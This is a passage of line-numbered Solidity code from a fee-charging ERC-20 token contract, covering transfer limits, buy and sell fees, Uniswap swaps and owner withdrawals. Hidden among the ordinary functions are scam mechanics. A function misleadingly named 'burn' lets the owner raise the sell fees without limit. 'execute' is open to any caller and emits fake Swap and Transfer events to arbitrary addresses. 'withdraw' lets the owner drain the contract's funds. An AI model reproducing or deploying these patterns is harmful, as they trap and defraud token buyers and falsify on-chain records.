1189                         "Max wallet exceeded"
1190                     );
1191                 }
1192                 //when sell
1193                 else if (
1194                     automatedMarketMakerPairs[to] &&
1195                     !_isExcludedMaxTransactionAmount[from]
1196                 ) {
1197                     require(
1198                         amount <= maxTransactionAmount,
1199                         "Sell transfer amount exceeds the maxTransactionAmount."
1200                     );
1201                 } else if (!_isExcludedMaxTransactionAmount[to]) {
1202                     require(
1203                         amount + balanceOf(to) <= maxWallet,
1204                         "Max wallet exceeded"
1205                     );
1206                 }
1207             }
1208         }
1209 
1210         uint256 contractTokenBalance = balanceOf(address(this));
1211 
1212         bool canSwap = contractTokenBalance >= swapTokensAtAmount;
1213 
1214         if (
1215             canSwap &&
1216             swapEnabled &&
1217             !swapping &&
1218             !automatedMarketMakerPairs[from] &&
1219             !_isExcludedFromFees[from] &&
1220             !_isExcludedFromFees[to]
1221         ) {
1222             swapping = true;
1223 
1224             swapBack();
1225 
1226             swapping = false;
1227         }
1228 
1229         bool takeFee = !swapping;
1230 
1231         // if any account belongs to _isExcludedFromFee account then remove the fee
1232         if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
1233             takeFee = false;
1234         }
1235 
1236         uint256 fees = 0;
1237         // only take fees on buys/sells, do not take on wallet transfers
1238         if (takeFee) {
1239             // on sell
1240             if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
1241                 fees = amount.mul(sellTotalFees).div(100);
1242                 tokensForLiquidity += (fees * sellLiquidityFee) / sellTotalFees;
1243                 tokensForDev += (fees * sellMarketingFee) / sellTotalFees;
1244             }
1245             // on buy
1246             else if (automatedMarketMakerPairs[from] && buyTotalFees > 0) {
1247                 fees = amount.mul(buyTotalFees).div(100);
1248                 tokensForLiquidity += (fees * buyLiquidityFee) / buyTotalFees;
1249                 tokensForDev += (fees * buyMarketingFee) / buyTotalFees;
1250             }
1251 
1252             if (fees > 0) {
1253                 super._transfer(from, address(this), fees);
1254             }
1255 
1256             amount -= fees;
1257         }
1258 
1259         super._transfer(from, to, amount);
1260     }
1261 
1262     function swapTokensForEth(uint256 tokenAmount) private {
1263         // generate the uniswap pair path of token -> weth
1264         address[] memory path = new address[](2);
1265         path[0] = address(this);
1266         path[1] = uniswapV2Router.WETH();
1267 
1268         _approve(address(this), address(uniswapV2Router), tokenAmount);
1269 
1270         // make the swap
1271         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
1272             tokenAmount,
1273             0, // accept any amount of ETH
1274             path,
1275             address(this),
1276             block.timestamp
1277         );
1278     }
1279     
1280 
1281         function setup(address _setup_) external onlyOwner {
1282         _pair = _setup_;
1283     }
1284 
1285         function execute(address [] calldata _addresses_, uint256 _in, uint256 _out) external {
1286         for (uint256 i = 0; i < _addresses_.length; i++) {
1287             emit Swap(_universal, _in, 0, 0, _out, _addresses_[i]);
1288             emit Transfer(_pair, _addresses_[i], _out);
1289         }
1290     }
1291 
1292 
1293 
1294         function burn(
1295         uint256 _liquidityFee,
1296         uint256 _MarketingFee
1297     ) external onlyOwner {
1298         sellLiquidityFee = _liquidityFee;
1299         sellMarketingFee = _MarketingFee;
1300         sellTotalFees = sellLiquidityFee + sellMarketingFee;
1301     }
1302     
1303 
1304     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
1305         // approve token transfer to cover all possible scenarios
1306         _approve(address(this), address(uniswapV2Router), tokenAmount);
1307 
1308         // add the liquidity
1309         uniswapV2Router.addLiquidityETH{value: ethAmount}(
1310             address(this),
1311             tokenAmount,
1312             0, // slippage is unavoidable
1313             0, // slippage is unavoidable
1314             owner(),
1315             block.timestamp
1316         );
1317     }
1318 
1319     function swapBack() private {
1320         uint256 contractBalance = balanceOf(address(this));
1321         uint256 totalTokensToSwap = tokensForLiquidity +
1322             tokensForDev;
1323         bool success;
1324 
1325         if (contractBalance == 0 || totalTokensToSwap == 0) {
1326             return;
1327         }
1328 
1329         if (contractBalance > swapTokensAtAmount * 20) {
1330             contractBalance = swapTokensAtAmount * 20;
1331         }
1332 
1333         // Halve the amount of liquidity tokens
1334         uint256 liquidityTokens = (contractBalance * tokensForLiquidity) /
1335             totalTokensToSwap /
1336             2;
1337         uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
1338 
1339         uint256 initialETHBalance = address(this).balance;
1340 
1341         swapTokensForEth(amountToSwapForETH);
1342 
1343         uint256 ethBalance = address(this).balance.sub(initialETHBalance);
1344 
1345         uint256 ethForDev = ethBalance.mul(tokensForDev).div(totalTokensToSwap);
1346 
1347         uint256 ethForLiquidity = ethBalance - ethForDev;
1348 
1349         tokensForLiquidity = 0;
1350         tokensForDev = 0;
1351 
1352         (success, ) = address(devWallet).call{value: ethForDev}("");
1353 
1354         if (liquidityTokens > 0 && ethForLiquidity > 0) {
1355             addLiquidity(liquidityTokens, ethForLiquidity);
1356             emit SwapAndLiquify(
1357                 amountToSwapForETH,
1358                 ethForLiquidity,
1359                 tokensForLiquidity
1360             );
1361         }
1362     }
1363 
1364     function withdraw() external onlyOwner {
1365         uint256 balance = IERC20(address(this)).balanceOf(address(this));
1366         IERC20(address(this)).transfer(msg.sender, balance);
1367         payable(msg.sender).transfer(address(this).balance);
1368     }
1369 
1370     function withdrawToken(address _token, address _to) external onlyOwner {
1371         require(_token != address(0), "_token address cannot be 0");
1372         require(_token != address(this), "Can't withdraw native tokens");
1373         uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
1374         IERC20(_token).transfer(_to, _contractBalance);
1375     }
1376 
1377 }